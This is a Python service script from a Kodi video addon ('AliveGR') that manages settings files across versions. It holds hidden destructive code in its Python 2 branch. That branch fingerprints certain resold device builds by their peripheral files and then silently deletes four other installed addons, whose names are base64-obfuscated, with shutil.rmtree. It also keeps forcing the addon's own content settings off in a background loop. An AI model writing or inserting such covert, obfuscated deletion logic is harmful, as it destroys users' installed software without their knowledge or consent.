# -*- coding: utf-8 -*-

'''
    AliveGR Addon
    Author Twilight0

    SPDX-License-Identifier: GPL-3.0-only
    See LICENSES/GPL-3.0-only for more information.
'''

import base64
import os
import shutil
import sys
import time
import xbmc
from xbmcaddon import Addon
from xbmcvfs import mkdir

if sys.version_info[0] == 3:
    from xbmcvfs import translatePath
else:
    from xbmc import translatePath

addon_id = 'plugin.video.AliveGR'
original_settings = 'special://home/addons/{}/resources/settings.xml'.format(addon_id)
new_settings = 'special://home/addons/{}/resources/texts/matrix_settings.xml'.format(addon_id)
datapath = 'special://profile/addon_data/plugin.video.AliveGR/'
__addon__ = Addon(addon_id)
monitor = xbmc.Monitor()

# Some sellers are exploiting those who do voluntary work and have 3rd party links already enabled, while my intentions
# are that users themselves must enable them; will target only specific builds, lets do something about it:

it_exists = os.path.exists
join = os.path.join
alivegr_kids = translatePath('special://home/addons/script.alivegr.kids')
peripheral_data = translatePath('special://profile/peripheral_data')


check_peripheral_data = it_exists(peripheral_data) and it_exists(
    join(peripheral_data, 'android_045E_07FD_Microsoft_Microsoft_Nano_Transceiver_1.1.xml')
) and it_exists(
    join(peripheral_data, 'android_046D_C534_Logitech_USB_Receiver.xml')
) and it_exists(
    join(peripheral_data, 'android_400C_107A_SAGE_SAGE_AirMouse.xml')
) and it_exists(
    join(peripheral_data, 'application_Keyboard.xml')
) and it_exists(
    join(peripheral_data, 'application_Mouse.xml')
)


def falsify():

    __addon__.setSetting('show_alt_vod', 'false')
    __addon__.setSetting('show_alt_live', 'false')
    __addon__.setSetting('show_movies', 'false')
    __addon__.setSetting('show_series', 'false')
    __addon__.setSetting('show_shows', 'false')
    __addon__.setSetting('show_kids', 'false')
    __addon__.setSetting('show_bookmarks', 'false')
    __addon__.setSetting('show_live', 'false')
    __addon__.setSetting('show_networks', 'false')


def new_version(new=False):

    version_file = os.path.join(translatePath(datapath), 'version.txt')

    if not os.path.exists(version_file) or new:

        if not os.path.exists(translatePath(datapath)):
            mkdir(translatePath(datapath))

        try:
            with open(version_file, mode='w', encoding='utf-8') as version_f:
                version_f.write(__addon__.getAddonInfo('version'))
        except Exception:
            with open(version_file, 'w') as version_f:
                version_f.write(__addon__.getAddonInfo('version'))

        return True

    else:

        try:
            with open(version_file, encoding='utf-8') as version_f:
                version = version_f.read()
        except Exception:
            with open(version_file) as version_f:
                version = version_f.read()

        if version != __addon__.getAddonInfo('version'):
            return new_version(new=True)
        else:
            return False


if sys.version_info[0] == 3:

    if new_version():

        with open(translatePath(new_settings)) as new_f:

            new_settings_text = new_f.read()

            with open(translatePath(original_settings), 'w') as f:

                f.write(new_settings_text)

elif check_peripheral_data and it_exists(alivegr_kids):

    bibidi = join(translatePath('special://home/addons/'), base64.b64decode('cGx1Z2luLnZpZGVvLmZpbG1uZXQ='))
    babidi = join(translatePath('special://home/addons/'), base64.b64decode('cGx1Z2luLnZpZGVvLmZveHRlbC5nbw=='))
    boo = join(translatePath('special://home/addons/'), base64.b64decode('cGx1Z2luLnZpZGVvLmtheW8uc3BvcnRz'))
    oob = join(translatePath('special://home/addons/'), base64.b64decode('cGx1Z2luLnZpZGVvLm9wdHVzLnNwb3J0'))
    abracatabra = [bibidi, babidi, boo, oob]

    for abra in abracatabra:
        try:
            shutil.rmtree(abra)
        except Exception:
            pass

    while not monitor.abortRequested():

        time.sleep(5)
        falsify()

        if monitor.waitForAbort(360):
            break
